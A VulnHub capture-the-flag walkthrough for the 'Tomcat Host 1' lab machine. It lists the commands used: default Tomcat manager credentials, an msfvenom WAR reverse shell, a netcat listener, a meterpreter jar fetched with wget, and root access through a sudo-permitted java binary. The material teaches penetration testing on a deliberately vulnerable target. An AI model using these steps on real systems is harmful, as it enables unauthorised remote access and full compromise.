---
published: true
layout: post
title: Tomcat Host
category: Vulnhub
---
**Url**: [Tomcat Host 1 VulnHub](https://www.vulnhub.com/entry/my-tomcat-host-1,457/) 

**Difficulty**: Easy/Beginner Level 

**Author**: Akanksha Sachin Verma 

### Enumeration

Firstly, a netdiscover scan will reveal how the machine can be identified on the network:

<pre>netdiscover -i eth1
some more code for example</pre>
    
![netdiscover](https://i.imgur.com/IhhB5af.png)

Then an nmap scan:

<pre>nmap -p- -A 192.168.56.110</pre>

![nmap](https://imgur.com/fqEpNx9.png)

A closer look at port 8080 on my browser reveals an Apache Tomcat/9.0.31 

![tomcat](https://imgur.com/e78J3dy.png)

Apache Tomcat is an application server designed to execute Java servlets and render web pages that use Java Server page coding.

The "Manager App" section requires a username and password. The default credentials for Tomcat work (tomcat:tomcat).

<pre>192.168.56.110:8080/manager/html</pre>

The Web Application Manager is an opportunity to upload a reverse shell. I'll be using msfvenom to create a reverse shell. This is a good website on how to use msfvenom for reference:

[Offensive Security](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

The payload must be a war file, listening on port 4444 with my local address.

<pre>msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=4444 -f war > fedai.war</pre>

This will be uploaded here:

![upload](https://imgur.com/N4Ns2uf.png)

Before executing the payload, listen on port 4444 with netcat:

<pre>nc -nvlp 4444</pre>

Now it must be executed, so we visit the path where it is kept, in my case /fedai. We now have a reverse shell. Uid is 'tomcat'.

<pre>id
python -c 'import pty;pty.spawn("/bin/bash")'</pre>

![deployed](https://imgur.com/2hdSVjH.png)


### User

Always check sudo privileges to see how we can start escalating privileges:

<pre>sudo -l</pre>
   
![sudo l](https://imgur.com/50SztJT.png)

As demonstrated, the user tomcat can run commands here:	/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java. This is an openjdk java binary file which we can use to exploit priviliges.

We'll be creating another reverse shell payload on meterpreter in a java file format. Listening port will be 5555 with my local IP address again. The file will be downloaded on the victims pc so this file will be created under the apache web directory on my machine.

<pre>msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp lhost=192.168.56.101 lport=5555 > fedai.jar</pre>

![www](https://imgur.com/0IDSyUh.png)

Start the apache2 service:

<pre>service apache2 start</pre>

Go to the temp directory on the victim's machine and transfer the payload over.

<pre>cd /tmp
wget http://192.168.56.101/fedai.jar</pre>

![wget](https://imgur.com/PmLq6W1.png)

### Root

Before executing, we need to set up the meterpreter payload listener on metasploit:

<pre>msfconsole
use exploit/multi/handler
set payload java/meterpreter/reverse_tcp
set lport 5555
run</pre>

![meterpreter](https://imgur.com/UWIDebS.png)

Let's execute this payload with the following command:

<pre>sudo java -jar fedai.jar</pre>

![exe](https://imgur.com/6tya58T.png)

We get a successful connection from the tomcat machine as seen on meterpreter, the current user has been identified as root!

![connection](https://imgur.com/4NfW5Ls.png)
